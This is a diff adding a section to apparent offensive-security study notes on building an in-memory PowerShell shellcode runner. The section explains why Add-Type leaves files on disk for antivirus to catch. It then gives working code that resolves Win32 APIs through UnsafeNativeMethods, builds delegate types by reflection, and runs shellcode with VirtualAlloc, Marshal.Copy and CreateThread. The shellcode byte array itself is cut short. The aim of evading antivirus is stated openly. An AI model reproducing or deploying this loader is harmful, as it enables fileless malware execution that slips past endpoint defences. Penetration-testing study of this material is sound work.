@@ -594,3 +594,204 @@ Explanation:
 &nbsp;
 
 ## In-Memory ShellCode Runner in Powershell
+
+### Problem With Add-Type
+
+- Add-Type uses the .Net Framework to compile the C# code containing Win32 APIs and call them.
+- The compilation process is done by Visual C# Command-Line Compiler (csc).
+- During this process, both the C# source code and C# Assembly are temporarily **written to disk**
+- This will likely be flagged by endpoint Antivirus.
+
+> Note : The filename to which the source code and assembly are written to are randomly generated, both have the same file name but different extension. Source code has a .cs extension while the assembly has the .dll extension
+
+### Leveraging UnsafeNativeMethods
+
+- Our original technique involved Add-Type and DllImports to locate functions in unmanaged dynamic linked libraries.
+- This however calls the csc compiler which writes to disk and this is potentially a roadblock as AV can flag it.
+- Another method called the Dynamic Lookup can be used to create a .Net assembly in memory.
+- Two Win32 APIs are provided by Windows to perform dynamic Lookup :
+  - _GetModuleHandle_ : This obtains the memory address of a particular DLL
+  - _GetProcAddress_ : This takes in the memory address of the DLL and the function name and returns the memory address of the function.
+- We can use these to locate any API, but we must invoke them **without** using Add-Type
+
+&nbsp;
+
+Since we cannot create assemblies, we can search for existing assemblies.
+
+Powershell script :
+
+    $Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
+    $Assemblies |
+        ForEach-Object {
+        $_.Location
+        $_.GetTypes()|
+            ForEach-Object {
+            $_ | Get-Member -Static| Where-Object {
+                $_.TypeName.Equals('Microsoft.Win32.UnsafeNativeMethods')
+            }
+        } 2> $null
+    }
+
+&nbsp;
+
+Explanation :
+
+- We first fetch all the assemblies loaded in the current powershell session
+- Then we look through them using the ForEach-Object and fetch it's location
+- We then fetch the types and class in a particular assembly by using the .GetTypes()
+- We again look through each object and get only the static objects are if any functions are to be used then classes must be declared as static
+- We then look for the UnsafeNativeMethods in the meta of the assemblies as if C# code wants to directly invoke Win32 API, then it must provide the Unsafe Keyword
+- Finally we pipe all the errors to NULL
+- We would then get the System.dll in the output, this can be used as it is a common library which is loaded and contains fundamental content such as data types and references.
+
+&nbsp;
+
+Powershell function to get the function address :
+
+    function LookupFunc {
+        Param ($moduleName, $functionName)
+        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+        $tmp=@()
+        $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+        return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+    }
+
+&nbsp;
+
+Explanation :
+
+1. The function takes in two parameters, moduleName and functionName
+2. It first fetches all the assemblies and filters out all the non-native assemblies with the GlobalAssemblyCache property.
+3. It then splits the path and check if the last value is System.dll
+4. We then use the GetType to obtain a reference to the System.dll at runtime.
+5. We create an array to store the GetProcAddress instances, we will resolve the first functions address later.
+6. We then fetch all the methods in the assembly and find the GetProcAddress, all instances will be stored in the array $tmp
+7. We then take the first instance address and then use the Invoke Method to find the address of the function name in that assembly.
+8. We would then return the address of the requested function.
+
+Using the above function, we can resolve any Win32 API without using Add-Type
+
+> Note : The GlobalAssemblyCache is a list of all registered and native assemblies on Windows
+
+> Documentation :
+>
+> - https://docs.microsoft.com/en-us/previous-versions/ms908443(v=msdn.10)
+> - https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
+
+&nbsp;
+
+Powershell script to invoke MessageBoxA Win32 API completely in memory:
+
+    function LookupFunc {
+        Param ($moduleName, $functionName)
+        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+        $tmp=@()
+        $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+        return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+    }
+
+    $MessageBoxA = LookupFunc user32.dll MessageBoxA
+
+    $MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+    $Domain = [AppDomain]::CurrentDomain
+    $MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+    $MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+
+    $MyConstructorBuilder = $MyTypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([IntPtr], [String], [String], [int]))
+    $MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+
+    $MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', [int], @([IntPtr], [String], [String], [int]))
+    $MyMethodBuilder.SetImplementationFlags('Runtime, Managed')
+
+    $MyDelegateType = $MyTypeBuilder.CreateType()
+    $MyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MessageBoxA, $MyDelegateType)
+    $MyFunction.Invoke([IntPtr]::Zero,"Hello World","This is My MessageBox",0)
+
+&nbsp;
+
+Explanation :
+
+1. The first function has been explained in the previous topic.
+2. We call the LookUp Function to fetch the address of the Win32 API MessageBoxA and store it in a variable.
+3. We then create a new assembly object with the name 'ReflectedDelegate' and assign it to the variable $MyAssembly
+4. We then configure the access mode through the DynamicAssemblyLanguage method so that it is an executable and not saved to disk.
+5. We then create a new module with custom name of 'InMemoryModule' and tell it not to include symbol information.
+6. The next line creates the delegate type which takes in three arguments.
+   - The first argument is the name of the delgate, in this case it is MyDelegateType
+   - The second is a combined list of attributes which is the type of class, public, non-extendable, and use ASCII instead of Unicode.
+   - The third argument specifies the type the delegate builds on top of. In this case it is MultiCaseDelegate class to create a delegate type with multiple arguments which allows us to call target APIs with multiple arguments.
+7. We then put the function prototype inside the type and make our own custom delegate type.
+   - First we define the contructor thorugh DefineConstructor method, which takes three arguments.
+   - The first argument contains the attributes of the constructor itself, here we need to make it public and require it to be referenced by both the name and signature
+   - In the last argument, we define the parameter types of the constructor which will become the function prototype.
+8. We then set the implementation flags using the SetImplementationFlags Method, we choose runtime and Managed as it is used during runtime and the code is managed.
+9. In the next line we tell the .Net Framework the delegate type to be used in calling a function. For this we use the Define method to specify the settings for the Invoke Method.
+10. We then instantiate our custom Constructor thorugh the CreateType Method.
+11. We then call the GetDelegateForFunctionPointer to link the function address and DelegateType and Invoke MessageBox.
+12. We can now execute this to pop a simple Hello World
+
+&nbsp;
+
+> Documentation :
+>
+> - https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/delegates/#:~:text=Delegates%20%28C%23%20Programming%20Guide%29%201%20Delegates%20Overview.%20Delegates,Language%20Specification.%20...%204%20Featured%20Book%20Chapters.%20?msclkid=b8062dedbb6411eca1f560986156741b
+> - https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.getdelegateforfunctionpointer?view=netframework-4.8
+> - https://docs.microsoft.com/en-us/dotnet/api/system.reflection.emit.typebuilder.definemethod?view=netframework-4.8
+> - https://docs.microsoft.com/en-us/dotnet/api/system.reflection.emit.typebuilder.createtype?view=netframework-4.8
+
+&nbsp;
+
+### Reflection Shellcode Runner in Powershell
+
+Powershell Script :
+
+    function LookupFunc {
+        Param ($moduleName, $functionName)
+        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+        $tmp=@()
+        $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+        return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+    }
+
+    function getDelegateType {
+        Param (
+            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+            [Parameter(Position = 1)] [Type] $delType = [Void]
+        )
+
+        $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+
+        $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+
+        $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
+
+        return $type.CreateType()
+    }
+
+    $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+
+    [Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...
+
+    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
+
+    $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
+
+    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
+
+&nbsp;
+
+Explanation:
+
+1. The LookUp Function and has Already been explained in the above topics.
+2. We first fetch the address of the _VirtualAlloc_ Win32 API, we then call the getDelegateType Function.
+3. We then call the GetDelegateForFunctionPointer and pass the address and delegate type as arguments, this is stored in a variable.
+4. We then invoke the above variable with the arguments - (Address, size, Allocation Type, protection)
+5. The $buf variable stores the generated shellcode
+6. This is copied into the created memory using the .Net Copy Function.
+7. Thread is Created using the _CreateThread_ by following the same steps as the _VirtualAlloc_ with Delegation.
+8. We also Invoke the _WaitForSingleObject_ using the same above steps. The arguments are the same as passed in previous snippets.
+
+&nbsp;
+
+# Working With Proxy
